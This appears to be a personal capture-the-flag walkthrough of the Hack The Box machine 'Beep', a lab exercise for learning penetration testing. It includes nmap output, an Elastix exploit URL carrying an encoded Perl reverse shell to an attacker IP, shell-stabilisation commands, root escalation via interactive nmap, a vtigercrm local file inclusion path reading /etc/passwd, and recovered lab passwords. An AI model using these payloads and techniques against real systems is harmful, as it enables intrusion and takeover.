
nmap
```
PORT      STATE SERVICE          REASON
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) TOP RESP-CODES LOGIN-DELAY(0) PIPELINING USER EXPIRE(NEVER) AUTH-RESP-CODE STLS UIDL APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            874/udp   status
|_  100024  1            877/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ACL CHILDREN RENAME UIDPLUS SORT=MODSEQ OK LISTEXT URLAUTHA0001 ATOMIC ID RIGHTS=kxte ANNOTATEMORE CONDSTORE SORT X-NETSCAPE IDLE MULTIAPPEND MAILBOX-REFERRALS IMAP4 THREAD=REFERENCES BINARY CATENATE NO QUOTA UNSELECT Completed STARTTLS LIST-SUBSCRIBED THREAD=ORDEREDSUBJECT LITERAL+ IMAP4rev1 NAMESPACE
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-title: Elastix - Login page
|_ssl-date: 2023-08-08T16:21:04+00:00; -5s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)

```

elastix named framework is running:
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230808215039.png]]
Also a service running on port 10000 webmin named
I found an exploit for this service which dated to 2012 , so when I ran even with some modifications it didn't run , the I saw the code it was just sending the url with the parameters that I manually modified and this was the url:
```
url = 'https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.33%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
```
Where I changed the extension from 1000 to 233 and I got the shell
got the shell stable with:
***
step 1:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

step 2:
do `ctrl+z` your main system terminal should have opened and then write this:
```
stty raw -echo; fg
```

then press `enter` two times , your terminal for the machine should be back , also type this to get some env variables like clear in that machine:
```
export TERM=xterm
```
***
We get the shell -> there are 2 users:
1. fanis {we find the user flag here}
2. spamfilter
Inside the `/var/www/` there was the db folder for us there was these files:
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230808225336.png]]
```
acl.db			 endpoint.db	       rate.db
addons.db		 fax.db		       register.db
address_book.db		 FTP.db		       samples.db
calendar.db		 hardware_detector.db  settings_2017Apr07_112326
control_panel_design.db  iptables.db	       settings.db
dashboard.db		 menu.db	       trunk.db
email.db		 network.db	       trunk-pbx.db
```
manually searching for pass in `/var/www/html/configs`:
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230808230841.png]]
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230808231018.png]]
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230808233816.png]]
I forgot to run `sudo -l` , when I did:
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230809003302.png]]
I did `sudo nmap --interactive` , and through that we can spawn a bash shell:`!sh` , we get shell as root
# Method 2: via LFI
I also found different endpoints
`https://10.10.10.7/vtigercrm/`
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230809001132.png]]
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230809001018.png]]
can we poison the log?, can we collect information credentials?
Ig we can: I found this file that had the credentials:
in the tigervnc endpoint
`graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action](https://10.10.10.7/vtigercrm/graph.php?current_language=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00&module=Accounts&action=)`
![[walkthroughs/HACKTHEBOX/Beep/IMG/Pasted image 20230809010459.png]]

```
jEhdIekWmdjE
amp111
amp109
```
Possible Valid Users:  
```
rootasterisk  
admin  
asteriskuser  
cyrus  
fanis  
spamfilter  
mysql
```
when we bruteforce the passwords for ssh we also find the password for root, as well as when we try it to webmin we see the creds working there too , we can create a task that can help us get the shell by uploading the reverse shell {I saw this on another writeup}
